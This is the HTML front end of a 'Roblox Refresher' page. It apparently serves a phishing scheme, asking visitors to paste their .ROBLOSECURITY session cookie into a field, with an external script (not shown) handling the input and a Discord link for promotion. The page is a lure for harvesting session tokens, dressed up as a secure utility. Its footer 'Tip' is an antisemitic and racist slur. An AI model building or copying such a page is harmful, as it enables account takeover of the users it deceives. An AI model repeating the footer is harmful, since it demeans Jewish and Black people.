<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Refresher UI</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <script src="/script.js" defer></script>

  <style>
    :root{
      --bg0: #070A12;
      --bg1: #050712;
      --text: rgba(255,255,255,.92);
      --muted: rgba(255,255,255,.62);
      --card: rgba(255,255,255,.06);
      --card2: rgba(255,255,255,.045);
      --stroke: rgba(140, 190, 255, .14);
      --accent: #7CB6FF;
      --accent2:#A8CEFF;
      --shadow: 0 26px 80px rgba(0,0,0,.62);
      --radius: 18px;
    }
    *{ box-sizing:border-box; }
    html, body{ height:100%; }
    body{
      margin:0;
      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color: var(--text);
      background:
        radial-gradient(900px 520px at 50% 26%, rgba(124,182,255,.10), transparent 60%),
        radial-gradient(700px 420px at 50% 42%, rgba(124,182,255,.06), transparent 58%),
        linear-gradient(180deg, var(--bg0), var(--bg1));
      display:grid;
      place-items:center;
      padding: 28px 16px;
    }
    .wrap{ width: min(760px, 100%); text-align:center; }
    .brand{ display:flex; flex-direction:column; align-items:center; gap: 10px; margin-bottom: 22px; }
    .brand-badge{ width: 54px; height: 54px; border-radius: 999px; display:grid; place-items:center; background: rgba(255,255,255,.05); border: 1px solid rgba(140,190,255,.18); box-shadow: 0 18px 50px rgba(0,0,0,.52); }
    .brand-badge svg{ width: 22px; height: 22px; color: var(--accent); }
    h1{ margin:0; font-weight: 600; letter-spacing: -0.02em; font-size: clamp(28px, 4vw, 40px); line-height: 1.15; }
    .sub{ margin:0; color: var(--muted); font-size: 13px; }
    .card{ width: min(560px, 100%); margin: 0 auto; border-radius: var(--radius); border: 1px solid var(--stroke); background: linear-gradient(180deg, var(--card), var(--card2)); box-shadow: var(--shadow); padding: 22px; text-align:left; position: relative; overflow: hidden; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); }
    .card::before{ content:""; position:absolute; inset: -2px; background: radial-gradient(520px 180px at 40% 0%, rgba(124,182,255,.12), transparent 60%); opacity: .55; pointer-events:none; }
    .card > *{ position: relative; }
    .row{ display:flex; gap: 12px; align-items:center; justify-content:space-between; margin-top: 14px; }
    .label{ margin: 0 0 10px; font-size: 13px; font-weight: 500; color: rgba(255,255,255,.70); }
    .input{ width: 100%; height: 46px; border-radius: 12px; border: 1px solid rgba(255,255,255,.10); background: rgba(0,0,0,.22); color: var(--text); padding: 0 14px; outline: none; font-size: 14px; transition: border-color 160ms ease, box-shadow 160ms ease, background 160ms ease; }
    .input::placeholder{ color: rgba(255,255,255,.34); }
    .input:focus{ border-color: rgba(124,182,255,.40); box-shadow: 0 0 0 4px rgba(124,182,255,.12); background: rgba(0,0,0,.28); }
    .btn{ width: 100%; height: 52px; border-radius: 14px; border: 1px solid rgba(124,182,255,.26); background: rgba(10, 14, 24, .66); color: var(--text); font-weight: 600; font-size: 14px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap: 10px; box-shadow: 0 16px 40px rgba(0,0,0,.38); transition: transform 120ms ease, border-color 160ms ease, background 160ms ease; }
    .btn:hover{ transform: translateY(-1px); border-color: rgba(124,182,255,.42); background: rgba(12, 18, 34, .74); }
    .btn:active{ transform: translateY(0); }
    .btn svg path{ stroke: var(--accent2); }
    .icon-btn{ flex: 0 0 auto; width: 44px; height: 44px; border-radius: 999px; display:grid; place-items:center; background: rgba(255,255,255,.05); border: 1px solid rgba(140,190,255,.16); box-shadow: 0 12px 30px rgba(0,0,0,.32); text-decoration: none; transition: transform 140ms ease, border-color 160ms ease, background 160ms ease; }
    .icon-btn:hover{ transform: translateY(-1px); border-color: rgba(124,182,255,.36); background: rgba(255,255,.07); }
    .icon-btn svg{ width: 18px; height: 18px; fill: rgba(255,255,255,.72); }
    .icon-btn:hover svg{ fill: rgba(168,206,255,.95); }
    .footer{ margin-top: 16px; font-size: 12px; color: rgba(255,255,255,.45); }
    .footer span{ color: rgba(168,206,255,.78); font-weight: 500; }
    @media (max-width: 420px){ .card{ padding: 18px; } .row{ gap: 10px; } }
  </style>
</head>
<body>
  <main class="wrap">
    <header class="brand">
      <div class="brand-badge" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6" /><path d="M12 6.2v13.6" stroke="currentColor" stroke-opacity="0.25" stroke-width="1.2" /></svg>
      </div>
      <h1>Roblox Refresher</h1>
      <p class="sub">Secure • Fast • Reliable</p>
    </header>
    <section class="card" aria-label="Refresher panel">
      <p class="label">.ROBLOSECURITY Cookie</p>
      <input class="input" type="text" placeholder="Paste your cookie here..." />
      <div class="row">
        <button class="btn" type="button" id="refreshButton">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 7.5v9l8-4.5-8-4.5z" stroke-width="1.8" stroke-linejoin="round"/></svg>
          Refresh
        </button>
        <a class="icon-btn" href="https://discord.gg/mysticv2" target="_blank" rel="noopener noreferrer" aria-label="Join Discord (mysticv2)">
          <svg viewBox="0 0 245 240" aria-hidden="true"><path d="M104.4 104.6c-5.7 0-10.2 5-10.2 11.1 0 6.1 4.6 11.1 10.2 11.1 5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1Zm36.2 0c-5.7 0-10.2 5-10.2 11.1 0 6.1 4.6 11.1 10.2 11.1 5.7 0 10.2-5 10.2-11.1 0-6.1-4.5-11.1-10.2-11.1Z"/><path d="M189.5 20h-134C41.3 20 30 31.3 30 45.2v134.1c0 13.9 11.3 25.2 25.2 25.2h113.3l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V45.2c0-13.9-11.3-25.2-25.1-25.2Zm-41.7 135.5s-3.9-4.7-7.2-8.8c14.3-4 19.7-13 19.7-13-4.5 2.9-8.8 4.9-12.6 6.2-5.5 2.3-10.8 3.8-16 4.7-10.6 2-20.3 1.5-28.7-.1-6.3-1.2-11.7-3-16.2-4.7-2.5-1-5.2-2.2-8-3.7-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.5-.3-2.2-1.2-3.4-2-3.4-2s5.2 8.8 19 12.9c-3.3 4.1-7.3 9-7.3 9-24-0.8-33.1-16.5-33.1-16.5 0-35 15.7-63.4 15.7-63.4 15.7-11.8 30.6-11.5 30.6-11.5l1.1 1.3c-19.6 5.6-28.7 14.1-28.7 14.1s2.4-1.3 6.5-3.2c11.8-5.2 21.2-6.6 25.1-6.9.6-.1 1.1-.1 1.7-.1 6.1-.8 13.1-1 20.5-.2 9.8 1.1 20.3 3.9 31.1 9.9 0 0-8.7-8.2-27.5-13.8l1.5-1.7s14.9-0.3 30.6 11.5c0 0 15.7 28.4 15.7 63.4 0 0-9.2 15.7-33.2 16.5Z"/></svg>
        </a>
      </div>
    </section>
    <p class="footer"><span>Tip:</span> Dont Be a Jew Or Black.</p>
    <div id="result" style="margin-top: 1rem; color: white;"></div>
    <div id="countdown"></div>
  </main>
</body>
</html>
